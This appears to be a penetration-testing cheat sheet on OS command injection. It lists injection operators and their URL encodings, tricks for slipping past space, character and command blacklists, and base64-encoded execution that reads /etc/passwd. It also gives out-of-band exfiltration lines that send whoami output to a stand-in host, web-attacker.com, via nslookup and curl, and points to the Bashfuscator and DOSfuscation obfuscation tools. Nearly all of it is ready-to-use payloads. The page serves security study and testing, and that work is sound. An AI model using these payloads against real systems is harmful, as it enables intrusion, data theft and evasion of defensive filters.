---
description: 'Command Injection is #3 in OWASP top 10.'
---

# Command Injection





### Command Injection Methods

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command**                       |
| ---------------------- | ----------------------- | ------------------------- | ------------------------------------------ |
| Semicolon              | `;`                     | `%3b`                     | Both                                       |
| New Line               | \n                      | `%0a`                     | Both                                       |
| Background             | `&`                     | `%26`                     | Both (second output generally shown first) |
| Pipe                   | `\|`                    | `%7c`                     | Both (only second output is shown)         |
| AND                    | `&&`                    | `%26%26`                  | Both (only if first succeeds)              |
| OR                     | `\|\|`                  | `%7c%7c`                  | Second (only if first fails)               |
| Sub-Shell              | ` `` `                  | `%60%60`                  | Both (Linux-only)                          |
| Sub-Shell              | `$()`                   | `%24%28%29`               | Both (Linux-only)                          |



_<mark style="color:red;">**Note:**</mark>_ The only exception may be the semi-colon `;`, which will not work if the command was being executed with `Windows Command Line (CMD)`, but would still work if it was being executed with `Windows PowerShell`.





### Bypassing Filters

Check out PayloadAllTheThings for more: [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space)

|                           |                        |
| ------------------------- | ---------------------- |
| **Using Tabs**            | `127.0.0.1%0a%09`      |
| **Using $IFS**            | `127.0.0.1%0a${IFS}`   |
| **Using Brace Expansion** | `127.0.0.1%0a{ls,-la}` |
| **Using New Line**        | `127.0.0.1%0a`         |





### Bypassing Blacklisted Characters



_**Linux:**_

|   |                    |
| - | ------------------ |
| / | ${PATH:0:1}        |
| ; | ${LS\_COLORS:10:1} |

_**Windows:**_



|    |                   |
| -- | ----------------- |
| \\ | $env:HOMEPATH\[0] |
| \\ | %HOMEPATH:\~6,11% |



### Character Shifting:

There are other techniques to produce the required characters without using them, like `shifting characters`. For example, the following Linux command shifts the character we pass by `1`. So, all we have to do is find the character in the ASCII table that is just before our needed character (we can get it with `man ascii`), then add it instead of `[` in the below example. This way, the last printed character would be the one we need:

```shell-session
$ man ascii     # \ is on 92, before it is [ on 91
$ echo $(tr '!-}' '"-~'<<<[)

\
```





### Bypassing Blacklisted Commands

```shell-session
$ w'h'o'am'i
$ w"h"o"am"i
$ who$@ami
$ w\ho\am\i
#### Advanced

$ (tr "[A-Z]" "[a-z]"<<<"WhOaMi")
$ $(a="WhOaMi";printf %s "${a,,}")

$ echo 'whoami' | rev
$ (rev<<<'imaohw')
```

_**Windows Only:**_

```powershell
C:\rottaj> who^ami
// Advanced
C:\rottaj> "whoami"[-1..-20] -join ''
C:\rottaj> iex "$('imaohw'[-1..-20] -join '')"
```



### Encoding Commands

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ echo -n 'cat /etc/passwd | grep 33' | base64
</strong></code></pre>

Now we can create a command that will decode the encoded string in a sub-shell (`$()`), and then pass it to `bash` to be executed (i.e. `bash<<<`), as follows:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ bash&#x3C;&#x3C;&#x3C;$(base64 -d&#x3C;&#x3C;&#x3C;Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
</strong></code></pre>

&#x20;_<mark style="color:red;">**Note:**</mark>_ that we are using `<<<` to avoid using a pipe `|`, which is a filtered character.



We can find more techniques on PayloadAllTheThings:

[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion)







### Injection through out-of-band (OAST) techniques

###

```
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```

```
&& curl web-attacker.com/$(whoami)
```

###

### Other Injection Operators

| **Injection Type**                      | **Operators**                                     |
| --------------------------------------- | ------------------------------------------------- |
| SQL Injection                           | `'` `,` `;` `--` `/* */`                          |
| Command Injection                       | `;` `&&`                                          |
| LDAP Injection                          | `*` `(` `)` `&` `\|`                              |
| XPath Injection                         | `'` `or` `and` `not` `substring` `concat` `count` |
| OS Command Injection                    | `;` `&` `\|`                                      |
| Code Injection                          | `'` `;` `--` `/* */` `$()` `${}` `#{}` `%{}` `^`  |
| Directory Traversal/File Path Traversal | `../` `..\\` `%00`                                |
| Object Injection                        | `;` `&` `\|`                                      |
| XQuery Injection                        | `'` `;` `--` `/* */`                              |
| Shellcode Injection                     | `\x` `\u` `%u` `%n`                               |
| Header Injection                        |  `\r`  `%0d` `%0a` `%09`                          |





### Evasion Tools

_**Linux:**_

_**Bashfuscator:**_ [_**https://github.com/Bashfuscator/Bashfuscator**_](https://github.com/Bashfuscator/Bashfuscator)

<pre class="language-shell-session"><code class="lang-shell-session">r$ git clone https://github.com/Bashfuscator/Bashfuscator
$ cd Bashfuscator
$ python3 setup.py install --user

<strong>$ ./bashfuscator -c 'cat /etc/passwd'
</strong>$ ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
# Testing
$ bash -c 'eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'
</code></pre>



_**Windows:**_

_**DOSfuscation:**_ [https://github.com/danielbohannon/Invoke-DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation)

